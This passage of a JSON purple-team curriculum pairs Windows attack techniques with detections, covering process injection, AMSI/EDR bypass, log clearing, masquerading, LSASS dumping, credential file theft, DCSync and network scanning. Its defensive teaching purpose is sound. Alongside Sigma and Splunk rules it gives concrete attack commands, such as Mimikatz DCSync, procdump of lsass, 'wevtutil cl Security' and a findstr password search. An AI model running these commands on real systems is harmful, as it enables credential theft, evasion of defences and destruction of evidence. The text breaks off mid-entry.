+            "technique": "Inject malicious code into a legitimate process (explorer.exe svchost.exe) to hide from process-based detection",
+            "attack_steps": [
+              "Open target process: OpenProcess(PROCESS_ALL_ACCESS FALSE targetPID)",
+              "Allocate memory: VirtualAllocEx(handle NULL size MEM_COMMIT PAGE_EXECUTE_READWRITE)",
+              "Write shellcode: WriteProcessMemory(handle allocatedMemory shellcode size NULL)",
+              "Execute: CreateRemoteThread(handle NULL 0 allocatedMemory NULL 0 threadId)",
+              "Malicious code now runs in the context of the legitimate process"
+            ],
+            "tools": [
+              "Cobalt Strike (shinject/inject)",
+              "Metasploit (migrate/inject)",
+              "Custom C/C++ injectors",
+              "ProcessHollowing tools",
+              "Vulcan"
+            ],
+            "attack_techniques": [
+              "T1055.001",
+              "T1055.002",
+              "T1055.003",
+              "T1055.004",
+              "T1055.012"
+            ],
+            "killchain_stage": "defense-evasion"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect cross-process memory operations: remote thread creation suspicious process access DLL loading anomalies and memory-disk image mismatch",
+            "logs": [
+              "Sysmon Event 8 (CreateRemoteThread) \u2014 source creates thread in target process",
+              "Sysmon Event 10 (ProcessAccess) \u2014 suspicious access masks (0x1FFFFF 0x143A 0x0040)",
+              "Sysmon Event 7 (ImageLoaded) \u2014 DLLs loaded from unusual paths into system processes",
+              "Sysmon Event 25 (ProcessTampering) \u2014 in-memory image mismatch (hollowing detection)"
+            ],
+            "detection_rules": [
+              "Sigma: create_remote_thread_into_system_process \u2014 Event 8 targeting svchost.exe explorer.exe lsass.exe from non-standard source",
+              "Sigma: sysmon_access_credentials_via_lsass_memory \u2014 Event 10 with TargetImage lsass.exe and GrantedAccess containing PROCESS_VM_READ",
+              "Splunk: index=sysmon EventCode=8 SourceImage!=TargetImage | where match(TargetImage (svchost|explorer|lsass)) and NOT match(SourceImage (csrss|services|MsMpEng))",
+              "Splunk: index=sysmon EventCode=25 \u2014 any ProcessTampering event is suspicious"
+            ],
+            "tools": [
+              "Sysmon",
+              "EDR (CrowdStrike SentinelOne Defender for Endpoint)",
+              "PE-sieve (memory scanner)",
+              "Moneta (memory anomaly detection)",
+              "Process Hacker",
+              "Volatility (memory forensics)"
+            ],
+            "controls": [
+              "EDR with API hooking and memory scanning",
+              "Sysmon with Events 8/10/7/25",
+              "Application isolation",
+              "PPL (Protected Process Light)"
+            ]
+          },
+          "gap_analysis": "Reflective DLL injection loads from memory without touching disk bypassing ImageLoaded (Event 7) detection. Process doppelganging uses NTFS transactions to evade file-based detection. Gap: legitimate software (AV debuggers management tools) also performs cross-process operations creating false positives. Must build good allowlists. Newer injection techniques (Module Stomping Extra Window Memory) may not generate standard Sysmon events.",
+          "drills": [
+            "Execute 4 injection techniques (DLL injection process hollowing APC injection reflective DLL). For each: identify which Sysmon events fire (8 10 7 25). Write Sigma rules for each pattern. Then run PE-sieve to find injected code in memory."
+          ],
+          "common_mistakes": [
+            "Not deploying Sysmon Event 8 or 10 (many configs omit them for performance)",
+            "Not filtering known-good cross-process activity (AV scanners management agents)",
+            "Relying only on process creation events and missing memory-level indicators"
+          ]
+        },
+        {
+          "id": "amsi-bypass-vs-amsi-tamper-detection",
+          "title": "AMSI Bypass & Tool Tampering (T1562.001) vs. Tamper Protection",
+          "concepts": [
+            "AMSI bypass: patching AmsiScanBuffer in memory to make AMSI always return clean enabling in-memory malware execution",
+            "AV/EDR tampering: disabling Windows Defender adding path exclusions stopping security services unregistering EDR drivers",
+            "Windows Defender Tamper Protection: prevents non-Microsoft processes from modifying Defender settings via registry/API",
+            "Tamper Protection blocks: stopping Microsoft Defender service adding exclusions disabling real-time protection turning off cloud-delivered protection",
+            "Detection of tampering: monitor for security tool service stoppage exclusion additions and AMSI-related registry changes"
+          ],
+          "key_facts": [
+            "Tamper Protection is enabled by default on Windows 10 1903+ \u2014 prevents Set-MpPreference exclusions via PowerShell",
+            "AMSI bypass code itself is captured in Script Block Logging (Event 4104) even though it succeeds in bypassing AMSI",
+            "Sysmon Event 1 can detect known AMSI bypass one-liners in command line arguments",
+            "Event 5001 (Windows Defender) indicates real-time protection was disabled"
+          ],
+          "attack_side": {
+            "technique": "Bypass or disable security tools (AMSI Defender EDR) to execute payloads undetected",
+            "attack_steps": [
+              "AMSI bypass: patch AmsiScanBuffer function in memory to return success without scanning",
+              "Alternative: force AMSI error via reflection (set amsiInitFailed = true)",
+              "Defender bypass: attempt to add exclusions disable real-time protection or stop the service",
+              "EDR evasion: unhook ntdll.dll use direct syscalls or use vulnerable signed drivers (BYOVD) to kill EDR process",
+              "With defenses bypassed: execute in-memory payloads without detection"
+            ],
+            "tools": [
+              "AmsiBypass techniques (AmsiScanBuffer patch force-error)",
+              "Direct Syscalls (SysWhispers)",
+              "EDRSandblast",
+              "PPLDump",
+              "BYOVD (bring your own vulnerable driver)"
+            ],
+            "attack_techniques": [
+              "T1562.001",
+              "T1562.006",
+              "T1027.013",
+              "T1562.002"
+            ],
+            "killchain_stage": "defense-evasion"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect AMSI bypass attempts in script block logs Defender tampering attempts EDR driver unload attempts",
+            "logs": [
+              "PowerShell Event 4104 (Script Block) \u2014 captures AMSI bypass code even when bypass succeeds",
+              "Windows Defender Event 5001 (real-time protection disabled) 5007 (anti-malware configuration changed)",
+              "Sysmon Event 1 \u2014 known AMSI bypass patterns in command line",
+              "Sysmon Event 6/7 \u2014 unsigned driver loading (BYOVD attacks)",
+              "Sysmon Event 4 (driver/service state change) \u2014 security service stopped"
+            ],
+            "detection_rules": [
+              "Sigma: posh_ps_amsi_bypass \u2014 Event 4104 with AmsiScanBuffer/amsiInitFailed/AMSIResult patterns",
+              "Sigma: win_defender_disabled \u2014 Event 5001 or Set-MpPreference -DisableRealtimeMonitoring",
+              "Sigma: win_defender_exclusion_added \u2014 Set-MpPreference -ExclusionPath added outside of deployment tools",
+              "Sigma: sysmon_unsigned_driver \u2014 Event 6 with unsigned or vulnerable driver loading"
+            ],
+            "tools": [
+              "Windows Defender Tamper Protection",
+              "Sysmon",
+              "EDR with tamper resistance",
+              "PPL (Protected Process Light) for EDR",
+              "Event Log monitoring"
+            ],
+            "controls": [
+              "Tamper Protection (enabled by default)",
+              "PPL for EDR processes",
+              "Driver block rules (Microsoft Vulnerable Driver Blocklist)",
+              "Script Block Logging"
+            ]
+          },
+          "gap_analysis": "Direct syscalls bypass EDR API hooks (user-mode hooks in ntdll.dll). BYOVD attacks load a vulnerable signed driver to kill EDR from kernel space. Gap: once the EDR is killed or unhooked it stops generating telemetry. Must have redundant logging (Sysmon independent of EDR) and alert on the tampering event itself immediately.",
+          "drills": [
+            "Execute an AMSI bypass. Confirm Event 4104 captured the bypass code. Write a Sigma rule. Then attempt to disable Defender \u2014 verify Tamper Protection blocks it and Event 5007 fires. Attempt a BYOVD attack with a vulnerable driver \u2014 verify Sysmon Event 6 catches it."
+          ],
+          "common_mistakes": [
+            "Not alerting on AMSI bypass attempts in Event 4104 \u2014 this is a high-fidelity signal",
+            "Disabling Tamper Protection for troubleshooting and forgetting to re-enable",
+            "Relying solely on EDR for detection \u2014 if EDR is tampered you are blind"
+          ]
+        },
+        {
+          "id": "clearing-logs-vs-log-integrity",
+          "title": "Clearing Event Logs (T1070.001) vs. Log Integrity & Forwarding",
+          "concepts": [
+            "Clearing Windows event logs: wevtutil cl Security / wevtutil cl System \u2014 erases audit trail",
+            "Attackers clear logs to cover their tracks after achieving objectives",
+            "Windows Event 1102 (audit log cleared) fires BEFORE the Security log is cleared \u2014 it is logged in the Security log itself",
+            "Log forwarding to centralized SIEM means clearing local logs doesnt destroy the evidence",
+            "Log integrity monitoring: detect gaps in log streams that indicate tampering"
+          ],
+          "key_facts": [
+            "Event 1102 (The audit log was cleared) is the primary detection for Security log clearing",
+            "System Event 104 (Event log was cleared) fires when System/Application logs are cleared",
+            "PowerShell Event 4104 captures Clear-EventLog or wevtutil cl commands",
+            "Clearing logs requires admin privileges \u2014 a non-admin clearing logs is highly suspicious"
+          ],
+          "attack_side": {
+            "technique": "Clear Windows event logs to remove evidence of attacker activity and hinder incident response",
+            "attack_steps": [
+              "Gain administrative privileges (prerequisite for clearing Security log)",
+              "Clear Security log: wevtutil cl Security or Clear-EventLog -LogName Security",
+              "Clear other relevant logs: System Application PowerShell Sysmon",
+              "Alternative: selectively delete specific events using techniques that modify the .evtx file directly",
+              "Result: forensic trail destroyed or partially obscured"
+            ],
+            "tools": [
+              "wevtutil.exe",
+              "Clear-EventLog (PowerShell)",
+              "PhantomDLL (manipulate event log service)",
+              "Invoke-Phantom (kernel-level log manipulation)"
+            ],
+            "attack_techniques": [
+              "T1070.001",
+              "T1070.002",
+              "T1562.002"
+            ],
+            "killchain_stage": "defense-evasion"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect log clearing via Event 1102/104 and detect log gaps via SIEM log integrity monitoring",
+            "logs": [
+              "Windows Security Event 1102 (The audit log was cleared) \u2014 fires in Security log before clearing",
+              "Windows System Event 104 (Event log was cleared)",
+              "PowerShell Event 4104 (Clear-EventLog or wevtutil cl in script blocks)",
+              "Sysmon Event 1 (wevtutil.exe with cl argument)"
+            ],
+            "detection_rules": [
+              "Sigma: win_eventlog_cleared \u2014 Event 1102 or 104 with SubjectUserName",
+              "Splunk: index=windows EventCode=1102 OR EventCode=104 \u2014 alert on any log clearing event",
+              "SIEM log gap detection: alert when expected log source stops sending (log stream monitoring)",
+              "Sigma: proc_creation_win_wevtutil_clearing \u2014 wevtutil.exe with cl argument"
+            ],
+            "tools": [
+              "Windows Event Forwarding (WEF)",
+              "Splunk Universal Forwarder",
+              "Syslog forwarding",
+              "EDR (stores telemetry independently of local logs)",
+              "Log integrity monitoring tools"
+            ],
+            "controls": [
+              "Centralized log forwarding (logs leave the host immediately)",
+              "Event 1102 alerting (real-time)",
+              "Log retention policies",
+              "Windows Event Collector (WEF) for enterprise log collection"
+            ]
+          },
+          "gap_analysis": "Event 1102 only fires for the Security log \u2014 clearing other logs may not generate an alert. Advanced techniques (Phantom DLL kernel-level .evtx manipulation) can clear logs without generating Event 1102. Gap: if logs arent forwarded to a central SIEM in real-time clearing local logs destroys evidence permanently.",
+          "drills": [
+            "Clear the Security log. Verify Event 1102 fires (it should appear in the log before its cleared). Set up real-time alerting on 1102. Then check if your SIEM detects the log stream gap from the affected host. Demonstrate that forwarded logs survive local clearing."
+          ],
+          "common_mistakes": [
+            "Not forwarding logs in real-time \u2014 batch forwarding means clearing logs between batches destroys evidence",
+            "Only monitoring Event 1102 (Security) and missing System/Application log clearing (Event 104)",
+            "Not alerting on wevtutil.exe usage in general \u2014 clearing logs outside of maintenance windows is suspicious"
+          ]
+        },
+        {
+          "id": "masquerading-vs-name-monitoring",
+          "title": "Masquerading (T1036) vs. Process Name & Path Monitoring",
+          "concepts": [
+            "Masquerading: renaming malicious binaries or processes to mimic legitimate system processes",
+            "Techniques: renaming malware as svchost.exe placing binaries in System32 to mimic legitimate locations",
+            "Process lineage: legitimate svchost.exe is always spawned by services.exe \u2014 a svchost.exe spawned by cmd.exe is suspicious",
+            "Signing status: legitimate system binaries are Microsoft-signed \u2014 masquerading binaries are often unsigned or differently signed",
+            "Detection: compare process name path parent process and digital signature against known-good baselines"
+          ],
+          "key_facts": [
+            "Legitimate svchost.exe always runs from C:\\Windows\\System32\\ and is spawned by services.exe",
+            "Sysmon Event 1 includes process path parent process and hash \u2014 enables full masquerading detection",
+            "Signing differences can be detected: legitimate Windows binaries have specific certificate chains",
+            "Double extensions (.pdf.exe) and RTL override are classic masquerading techniques"
+          ],
+          "attack_side": {
+            "technique": "Rename malicious executables to mimic legitimate system binaries and run them from system directories",
+            "attack_steps": [
+              "Copy payload to C:\\Windows\\System32\\svchost.exe (requires admin) or C:\\Users\\Public\\svchost.exe",
+              "Execute with misleading name \u2014 blends into process list",
+              "Alternative: use spaces in names (svchost .exe) right-to-left override or parent PID spoofing",
+              "Alternative: place payload in a path that looks legitimate (C:\\Windows\\Update\\svchost.exe)"
+            ],
+            "tools": [
+              "Custom payload builders",
+              "Cobalt Strike (spawnto and process inject settings)",
+              "ProcessHollowing tools"
+            ],
+            "attack_techniques": [
+              "T1036",
+              "T1036.005",
+              "T1036.003",
+              "T1036.006"
+            ],
+            "killchain_stage": "defense-evasion"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect processes with system-process names running from non-standard paths with unexpected parents or unsigned",
+            "logs": [
+              "Sysmon Event 1 (Process Creation) \u2014 includes Image (full path) ParentImage and hashes",
+              "Windows Security Event 4688 with command line and process path",
+              "Sysmon Event 7 (Image Loaded) \u2014 DLLs loaded by masqueraded processes",
+              "Sysmon Event 1 with OriginalFileName field (Sysmon captures original filename even if renamed)"
+            ],
+            "detection_rules": [
+              "Sigma: proc_creation_win_svchost_from_non_system_path \u2014 Image contains svchost.exe but NOT from System32",
+              "Sigma: proc_creation_win_svchost_wrong_parent \u2014 svchost.exe with parent other than services.exe",
+              "Splunk: index=sysmon EventCode=1 Image=*svchost.exe | where NOT match(Image (?i)System32\\svchost) OR NOT match(ParentImage (?i)services.exe)",
+              "Sigma: proc_creation_win_unsigned_binary_renamed \u2014 OriginalFileName field mismatch with Image name"
+            ],
+            "tools": [
+              "Sysmon (with OriginalFileName field)",
+              "EDR with process lineage",
+              "WDAC (Windows Defender Application Control)"
+            ],
+            "controls": [
+              "WDAC code integrity policies",
+              "Sysmon OriginalFileName field tracking",
+              "Process parent-child correlation",
+              "File hash allowlisting"
+            ]
+          },
+          "gap_analysis": "Sysmons OriginalFileName field (from PE version resource) helps detect renamed binaries but attackers can modify PE resources to match. Parent process checking is effective but parent PID spoofing can evade it. Gap: many orgs dont check process signatures at runtime only at file-level scanning time.",
+          "drills": [
+            "Copy a benign payload as svchost.exe to a non-standard location and execute it. Verify Sysmon Event 1 flags the wrong path/parent. Write Sigma rules for svchost path/parent validation. Check OriginalFileName field to confirm it differs from the real svchost.exe."
+          ],
+          "common_mistakes": [
+            "Only checking process name not full path or parent process",
+            "Not using Sysmons OriginalFileName field (available since Sysmon 7.01)",
+            "Not maintaining a baseline of legitimate parent-child process relationships"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "credential-access-pairings",
+      "title": "Credential Access \u2014 LSASS Dumping & Kerberoasting vs. Credential Guard",
+      "difficulty": "advanced",
+      "prerequisites": [
+        "privilege-escalation-pairings"
+      ],
+      "objective": "Learner can execute credential theft attacks and configure the full defensive stack: LSASS protection, Credential Guard, Sysmon monitoring, and EDR detection.",
+      "topics": [
+        {
+          "id": "lsass-dumping-vs-lsass-protection",
+          "title": "LSASS Memory Dumping (T1003.001) vs. LSASS Protection & Credential Guard",
+          "concepts": [
+            "LSASS (Local Security Authority Subsystem Service): stores credentials in memory including NTLM hashes Kerberos tickets and plaintext passwords",
+            "Credential dumping: reading LSASS memory to extract credentials (Mimikatz sekurlsa::logonpasswords)",
+            "Windows Defender Credential Guard: virtualization-based security (VBS) that isolates credential secrets in a secure enclave",
+            "LSASS Protected Process Light (PPL): prevents non-protected processes from reading LSASS memory",
+            "RunAsPPL registry setting: enables PPL for lsass.exe"
+          ],
+          "key_facts": [
+            "Sysmon Event 10 (ProcessAccess) with TargetImage lsass.exe is the primary LSASS access detection",
+            "GrantedAccess mask 0x1410 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION) is common for credential dumping",
+            "Credential Guard stores secrets in LSAISO (isolated LSAS) process that LSASS cannot access directly",
+            "Event 4656 (handle requested) and 4663 (object accessed) can audit LSASS access if SACL is configured"
+          ],
+          "attack_side": {
+            "technique": "Dump LSASS process memory to extract credentials including NTLM hashes Kerberos tickets and plaintext passwords",
+            "attack_steps": [
+              "Obtain admin/SYSTEM privileges (required to access LSASS memory)",
+              "Method 1: Mimikatz sekurlsa::logonpasswords (reads LSASS in-process)",
+              "Method 2: Create LSASS minidump: procdump -ma lsass.exe lsass.dmp (then parse offline with Mimikatz/pypykatz)",
+              "Method 3: Direct memory copy via comsvcs.dll MiniDump (rundll32 comsvcs.dll MiniDump)",
+              "Extract credentials: NTLM hashes (for Pass-the-Hash) Kerberos tickets (for Pass-the-Ticket) plaintext passwords"
+            ],
+            "tools": [
+              "Mimikatz",
+              "procdump (Sysinternals)",
+              "pypykatz (offline LSASS parsing)",
+              "Comsvcs.dll MiniDump",
+              "SharpDump",
+              "Out-Minidump"
+            ],
+            "attack_techniques": [
+              "T1003.001",
+              "T1003",
+              "T1555"
+            ],
+            "killchain_stage": "credential-access"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect any process accessing LSASS memory for read operations \u2014 use Sysmon Event 10 with lsass.exe as target",
+            "logs": [
+              "Sysmon Event 10 (ProcessAccess) \u2014 TargetImage lsass.exe with suspicious GrantedAccess masks",
+              "Windows Security Event 4656 (Handle Requested) on lsass.exe \u2014 if SACL auditing configured",
+              "Windows Security Event 4663 (Object Access) \u2014 if object access auditing on LSASS",
+              "Sysmon Event 11 (FileCreate) \u2014 lsass.dmp or similar dump file creation",
+              "Windows Defender Event 1116/1117 \u2014 Mimikatz detection"
+            ],
+            "detection_rules": [
+              "Sigma: sysmon_mimikatz_detection_lsass_access \u2014 Event 10 with TargetImage lsass.exe and GrantedAccess containing 0x10 or 0x1410",
+              "Splunk: index=sysmon EventCode=10 TargetImage=*lsass.exe | where match(GrantedAccess (?i)0x10) | where NOT match(SourceImage (?i)(svchost|csrss|MsMpEng|wininit))",
+              "Sigma: file_create_lsass_dump \u2014 Event 11 with filename matching *lsass*.dmp or *.dmp in temp directories"
+            ],
+            "tools": [
+              "Sysmon (Event 10 for LSASS access)",
+              "EDR (automatic LSASS protection)",
+              "Microsoft Defender Credential Guard",
+              "RunAsPPL (PPL for lsass.exe)",
+              "Microsoft Defender for Identity"
+            ],
+            "controls": [
+              "Credential Guard (VBS isolation)",
+              "RunAsPPL (PPL protection)",
+              "Sysmon Event 10 LSASS monitoring",
+              "EDR LSASS protection rules",
+              "Event 4656 SACL on LSASS"
+            ]
+          },
+          "gap_analysis": "Credential Guard can be bypassed with techniques like DumpGuard (abusing Remote Credential Guard protocol). PPL can be bypassed with vulnerable signed drivers (BYOVD). Some legitimate tools (AV scanning management agents) access LSASS creating false positives. Gap: offline LSASS dump parsing (pypykatz) is undetectable after the fact \u2014 must catch the dump creation not the parsing.",
+          "drills": [
+            "Execute 3 LSASS dumping methods (Mimikatz procdump comsvcs.dll). For each verify Sysmon Event 10 fires with appropriate GrantedAccess mask. Write Sigma rules. Then enable Credential Guard and PPL \u2014 show how Mimikatz fails. Attempt a BYOVD bypass and detect it via driver loading events."
+          ],
+          "common_mistakes": [
+            "Not configuring Sysmon Event 10 with LSASS-specific filters (too noisy without filtering)",
+            "Relying only on PPL without Credential Guard (PPL can be bypassed)",
+            "Not building allowlists for legitimate LSASS access (AV management tools)"
+          ]
+        },
+        {
+          "id": "credential-theft-from-files-vs-detection",
+          "title": "Credentials in Files (T1552) vs. Credential Store Monitoring",
+          "concepts": [
+            "Attackers search for credentials stored in files: configuration files scripts with embedded passwords SSH keys browser-stored passwords",
+            "Common locations: web.config app.config unattend.xml Group Policy Preferences (cpassword) .bash_history .ssh/id_rsa",
+            "Browser credential stores: Chrome Login Data (SQLite) Firefox logins.json Windows Credential Manager",
+            "Detection: monitor for bulk file access patterns credential store access and credential file content",
+            "Group Policy Preferences (GPP) passwords: AES-256 key is published by Microsoft making stored cpasswords decryptable"
+          ],
+          "key_facts": [
+            "GPP cpassword can be decrypted with Microsoft published AES key \u2014 any SYSVOL XML file with cpassword is vulnerable",
+            "Chrome stores passwords in %LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data (SQLite encrypted with DPAPI)",
+            "Sysmon Event 11 (FileCreate) can detect access to known credential file paths",
+            "Sysmon Event 3 (Network Connection) from password-cracking tools indicates exfiltration"
+          ],
+          "attack_side": {
+            "technique": "Search the file system for stored credentials including configuration files browser stores and SSH keys",
+            "attack_steps": [
+              "Enumerate credential file locations: findstr /si password *.txt *.xml *.config *.ini",
+              "Check Group Policy Preferences: Get-GPPPassword (decrypts cpassword in SYSVOL XML files)",
+              "Extract browser credentials: SharpChrome/SharpFox or LaZagne",
+              "Collect SSH keys: copy ~/.ssh/id_rsa check SSH agent",
+              "Parse Windows Credential Manager: cmdkey /list or vaultcmd"
+            ],
+            "tools": [
+              "LaZagne",
+              "SharpChrome",
+              "Get-GPPPassword (PowerSploit)",
+              "Seatbelt",
+              "SharpWeb",
+              "mimikatz (dpapi::cred dpapi::masterkey)"
+            ],
+            "attack_techniques": [
+              "T1552.001",
+              "T1552.004",
+              "T1552.002",
+              "T1555.003",
+              "T1555.004"
+            ],
+            "killchain_stage": "credential-access"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect bulk file access patterns credential store database access and known credential-theft tool execution",
+            "logs": [
+              "Sysmon Event 11 (FileCreate) \u2014 access to credential file types (.config .xml with passwords)",
+              "Sysmon Event 1 (Process Creation) \u2014 known credential theft tools (LaZagne SharpChrome Seatbelt)",
+              "Sysmon Event 10 (ProcessAccess) \u2014 access to browser credential databases",
+              "Windows Security Event 4663 (Object Access) \u2014 file access auditing on credential files",
+              "Sysmon Event 3 (Network Connection) \u2014 data exfiltration from credential theft tools"
+            ],
+            "detection_rules": [
+              "Sigma: proc_creation_win_lazagne_execution \u2014 LaZagne or known credential theft tool execution",
+              "Sigma: proc_creation_win_findstr_password \u2014 findstr.exe with password argument (credential search)",
+              "Sigma: file_create_win_credentials_in_files \u2014 access to web.config unattend.xml .ssh/id_rsa",
+              "Splunk: index=sysmon EventCode=11 TargetFilename=*web.config OR TargetFilename=*unattend.xml OR TargetFilename=*.kdbx"
+            ],
+            "tools": [
+              "Sysmon (file access monitoring)",
+              "EDR",
+              "File integrity monitoring (FIM)",
+              "Windows DPAPI (Data Protection API)"
+            ],
+            "controls": [
+              "Remove GPP passwords from SYSVOL",
+              "Credential storage in enterprise vaults (not files)",
+              "DPAPI encryption for stored credentials",
+              "File access auditing on sensitive directories"
+            ]
+          },
+          "gap_analysis": "Credential theft from files is hard to detect because file reads are normal activity. Bulk access patterns (reading many files quickly searching with findstr for password) are more indicative than individual file access. Gap: DPAPI-protected credentials are only accessible in the user context \u2014 if the attacker runs as that user DPAPI provides no protection.",
+          "drills": [
+            "Run Seatbelt and LaZagne to collect credentials. Identify which Sysmon events fire. Write Sigma rules for credential-theft tool execution. Then implement GPP password cleanup and show that Get-GPPPassword finds nothing."
+          ],
+          "common_mistakes": [
+            "Not auditing access to credential files (web.config unattend.xml)",
+            "Leaving GPP passwords in SYSVOL (should be removed after MS14-025 patch)",
+            "Not monitoring for known credential-theft tools by hash/name"
+          ]
+        },
+        {
+          "id": "dcsync-vs-dc-monitoring",
+          "title": "DCSync (T1003.006) vs. Domain Controller Monitoring",
+          "concepts": [
+            "DCSync: simulates the behavior of a Domain Controller to request password replication data via DRSUAPI",
+            "Requires Replicating Directory Changes and Replicating Directory Changes All privileges (normally only DCs have these)",
+            "Attackers with these privileges (Domain Admins or accounts with delegated replication rights) can dump all domain password hashes",
+            "Mimikatz lsadump::dcsync can dump any user hash including krbtgt (for Golden Ticket attacks)",
+            "Detection: monitor for replication requests (DRSUAPI) from non-DC systems"
+          ],
+          "key_facts": [
+            "DCSync uses the IDL_DRSGetNCChanges RPC method via the DRSUAPI interface",
+            "Only Domain Controllers should send replication requests \u2014 any other system doing so is suspicious",
+            "Windows Event 4662 (object operation) logs directory service replication access",
+            "DCSync can dump krbtgt hash which enables Golden Ticket creation (T1558.001)"
+          ],
+          "attack_side": {
+            "technique": "Use DRSUAPI replication to extract password hashes for any/all domain accounts from a Domain Controller",
+            "attack_steps": [
+              "Obtain an account with replication privileges (Domain Admin or account with DS-Replication-Get-Changes-All)",
+              "Execute Mimikatz: lsadump::dcsync /domain:corp.local /user:krbtgt",
+              "Mimikatz sends DRSUAPI replication request to a DC receives password hash",
+              "Use extracted hashes: krbtgt for Golden Ticket Domain Admin hashes for lateral movement",
+              "Alternative: Impacket secretsdump.py -just-dc for automated DCSync"
+            ],
+            "tools": [
+              "Mimikatz (lsadump::dcsync)",
+              "Impacket (secretsdump.py)",
+              "DSInternals PowerShell"
+            ],
+            "attack_techniques": [
+              "T1003.006",
+              "T1003",
+              "T1558.001"
+            ],
+            "killchain_stage": "credential-access"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect directory service replication requests from non-Domain Controller systems via Event 4662",
+            "logs": [
+              "Windows Security Event 4662 (object operation on directory service) with replication GUIDs",
+              "GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes)",
+              "GUID 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All)",
+              "GUID 89e95b76-444d-4c62-991a-0facbeda640c (DS-Replication-Get-Changes-In-Filtered-Set)"
+            ],
+            "detection_rules": [
+              "Sigma: win_dcsync \u2014 Event 4662 from non-DC computer with replication GUIDs",
+              "Splunk: index=windows EventCode=4662 Properties=*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2* | where NOT match(SourceComputerName (?i)DC-)",
+              "Sigma: win_dcsync_mimikatz \u2014 Event 4662 with DRSUAPI replication from unexpected source"
+            ],
+            "tools": [
+              "Windows DC audit logging (Directory Service Access)",
+              "Microsoft Defender for Identity (automatic DCSync detection)",
+              "Splunk/Elastic SIEM",
+              "Sysmon (process-level on DCs)"
+            ],
+            "controls": [
+              "Tier 0 admin model (restrict replication privileges)",
+              "Microsoft Defender for Identity",
+              "Monitor Event 4662 on DCs",
+              "Just enough administration (JEA)"
+            ]
+          },
+          "gap_analysis": "DCSync is highly effective because its a legitimate replication protocol. Detection must focus on the SOURCE of the request \u2014 only DCs should send replication requests. Gap: if an attacker compromises a DC they can DCSync from that DC without triggering source-based alerts. Must also monitor for unusual replication volume and timing.",
+          "drills": [
+            "Execute Mimikatz DCSync from a non-DC system. Verify Event 4662 fires with replication GUIDs. Write a Sigma rule filtering for non-DC sources. Then demonstrate Golden Ticket creation with the extracted krbtgt hash."
+          ],
+          "common_mistakes": [
+            "Not auditing Directory Service replication (Event 4662 requires SACL configuration on the domain)",
+            "Only monitoring one replication GUID \u2014 must monitor all three",
+            "Not implementing Tier 0 admin model (too many accounts with replication privileges)"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "discovery-lateral-pairings",
+      "title": "Discovery & Lateral Movement \u2014 Scanning, Pass-the-Hash & RDP vs. Network Analytics",
+      "difficulty": "advanced",
+      "prerequisites": [
+        "credential-access-pairings"
+      ],
+      "objective": "Learner can perform network discovery and lateral movement techniques and build detections using Windows logon events, Sysmon, and network analytics.",
+      "topics": [
+        {
+          "id": "network-scanning-vs-behavioral-analytics",
+          "title": "Network Service Discovery (T1046) vs. Network Behavioral Analytics",
+          "concepts": [
+            "Network scanning: enumerating open ports and services across the network to find attack targets",
+            "Common tools: nmap masscan netexec (formerly CrackMapExec) Nmap NSE scripts",
+            "Internal scanning is a strong indicator of post-compromise activity \u2014 legitimate IT scanning is scheduled and from known scanners",
+            "Detection: port scan detection (many connections to many ports from single source) abnormal scanning times/patterns",
+            "Zeek network monitoring captures all connection metadata for analysis"
+          ],
+          "key_facts": [
+            "nmap -sS (SYN scan) generates thousands of SYN packets without completing handshakes",
+            "Zeek conn.log captures every connection with source/destination/port/duration/bytes",
+            "Logon failures (Event 4625) spike during brute-force and scanning activity",
+            "RITA (Real Intelligence Threat Analytics) analyzes Zeek logs for beaconing scanning and DNS tunneling"
+          ],
+          "attack_side": {
+            "technique": "Scan the internal network to identify open ports services and potential lateral movement targets",
+            "attack_steps": [
+              "Port scan: nmap -sS -p- 10.0.0.0/24 (scan all ports on subnet)",
+              "Service identification: nmap -sV target (identify service versions)",
+              "Enumerate shares: netexec smb 10.0.0.0/24 (find SMB shares)",
+              "Enumerate users: netexec smb target --users (domain user enumeration)",
+              "Identify vulnerabilities: nmap --script vuln target"
+            ],
+            "tools": [
+              "nmap",
+              "masscan",
+              "netexec (CrackMapExec)",
+              "Nmap NSE",
+              "FScan",
+              "RustScan",
+              "SharpHound (AD graph)"
+            ],
+            "attack_techniques": [
+              "T1046",
+              "T1018",
+              "T1087",
+              "T1069",
+              "T1016"
+            ],
+            "killchain_stage": "discovery"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect port scanning patterns rapid connection attempts to multiple hosts/ports and brute-force authentication",
+            "logs": [
+              "Zeek conn.log \u2014 connection metadata for port scan pattern detection",
+              "Windows Security Event 4625 (failed logon) \u2014 brute-force detection",
+              "Firewall logs \u2014 connection attempts to multiple internal hosts",
+              "Sysmon Event 3 (Network Connection) \u2014 process initiating many connections",
+              "IDS alerts (Suricata/Snort) \u2014 nmap signature detection"
+            ],
+            "detection_rules": [
+              "Zeek/RITA: beaconing and scanning detection from conn.log analysis",
+              "Splunk: index=firewall | stats dc(dest_port) by src_ip | where dc(dest_port) > 50 \u2014 port scan pattern",
+              "Sigma: win_multiple_failed_logons \u2014 Event 4625 count > threshold in time window",
+              "Suricata: ET scan rules for nmap/masscan signatures"
+            ],
+            "tools": [
+              "Zeek (Bro)",
+              "RITA",
+              "Suricata",
+              "Snort",
+              "Splunk/Elastic SIEM",
+              "NetFlow analysis tools"
+            ],
+            "controls": [
+              "Network segmentation (limit scanning blast radius)",
+              "Firewall ACLs between segments",
+              "IDS/IPS",
+              "Windows logon failure monitoring (Account Lockout Policy)"
+            ]
+          },
+          "gap_analysis": "Slow scanning (one port per minute) evades rate-based detection. Legitimate vulnerability scanners create noise that masks malicious scanning. Gap: many orgs dont deploy Zeek internally (only at perimeter) missing internal lateral scanning. Must baseline legitimate scanner activity to filter it.",
+          "drills": [
